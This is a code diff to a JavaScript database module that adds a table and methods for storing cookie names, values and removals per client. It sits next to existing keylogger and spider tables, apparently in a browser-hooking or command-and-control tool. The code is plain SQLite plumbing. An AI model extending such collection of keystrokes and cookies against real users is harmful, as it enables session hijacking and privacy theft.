@@ -84,6 +84,18 @@ export function createDatabase(dbPath) {
 
     CREATE INDEX IF NOT EXISTS idx_keylogger_client ON keylogger_entries(client_id);
     CREATE INDEX IF NOT EXISTS idx_keylogger_timestamp ON keylogger_entries(client_id, timestamp);
+
+    CREATE TABLE IF NOT EXISTS cookie_entries (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      client_id TEXT NOT NULL,
+      name TEXT NOT NULL,
+      value TEXT,
+      removed INTEGER NOT NULL DEFAULT 0,
+      timestamp INTEGER NOT NULL
+    );
+
+    CREATE INDEX IF NOT EXISTS idx_cookie_entries_client ON cookie_entries(client_id);
+    CREATE INDEX IF NOT EXISTS idx_cookie_entries_timestamp ON cookie_entries(client_id, timestamp);
   `);
 
   // Idempotent migrations — each ALTER TABLE is wrapped in try/catch because
@@ -248,6 +260,18 @@ export function createDatabase(dbPath) {
     "DELETE FROM keylogger_entries WHERE client_id = ?"
   );
 
+  // Prepared statements — cookie_entries
+  const insertCookieEntryStmt = db.prepare(
+    `INSERT INTO cookie_entries (client_id, name, value, removed, timestamp)
+     VALUES (?, ?, ?, ?, ?)`
+  );
+  const getCookieEntriesStmt = db.prepare(
+    "SELECT * FROM cookie_entries WHERE client_id = ? ORDER BY timestamp ASC, id ASC"
+  );
+  const deleteCookieEntriesByClientStmt = db.prepare(
+    "DELETE FROM cookie_entries WHERE client_id = ?"
+  );
+
   /**
    * Map a raw `links` row to the public link shape.
    * @param {object|undefined} row
@@ -333,6 +357,21 @@ export function createDatabase(dbPath) {
   }
 
   /**
+   * Map a raw `cookie_entries` row to the public entry shape.
+   * @param {object} row
+   * @returns {object}
+   */
+  function rowToCookieEntry(row) {
+    return {
+      id: row.id,
+      name: row.name,
+      value: row.value,
+      removed: row.removed === 1,
+      timestamp: row.timestamp,
+    };
+  }
+
+  /**
    * Map a raw `spider_content` row (metadata only — no BLOB) to the public version shape.
    * @param {object} row
    * @returns {object}
@@ -357,6 +396,7 @@ export function createDatabase(dbPath) {
     deleteSpiderResultsByClientStmt.run(clientId);
     deleteSpiderContentByClientStmt.run(clientId);
     deleteKeyloggerEntriesByClientStmt.run(clientId);
+    deleteCookieEntriesByClientStmt.run(clientId);
     deleteClientStmt.run(clientId);
   }
 
@@ -617,6 +657,28 @@ export function createDatabase(dbPath) {
     /** Delete all keylogger entries for a client. */
     clearKeyloggerEntries(clientId) {
       deleteKeyloggerEntriesByClientStmt.run(clientId);
+    },
+
+    /**
+     * Insert a cookie entry for a client.
+     * @param {string} clientId
+     * @param {string} name - Cookie name
+     * @param {string|null} value - Cookie value (null when removed)
+     * @param {boolean} removed - True if the cookie was deleted
+     * @param {number} timestamp - Unix timestamp in milliseconds
+     */
+    insertCookieEntry(clientId, name, value, removed, timestamp) {
+      insertCookieEntryStmt.run(clientId, name, value ?? null, removed ? 1 : 0, timestamp);
+    },
+
+    /** Get all cookie entries for a client in timestamp order. */
+    getCookieEntries(clientId) {
+      return getCookieEntriesStmt.all(clientId).map(rowToCookieEntry);
+    },
+
+    /** Delete all cookie entries for a client. */
+    clearCookieEntries(clientId) {
+      deleteCookieEntriesByClientStmt.run(clientId);
     },
 
     /** Close the database connection. */
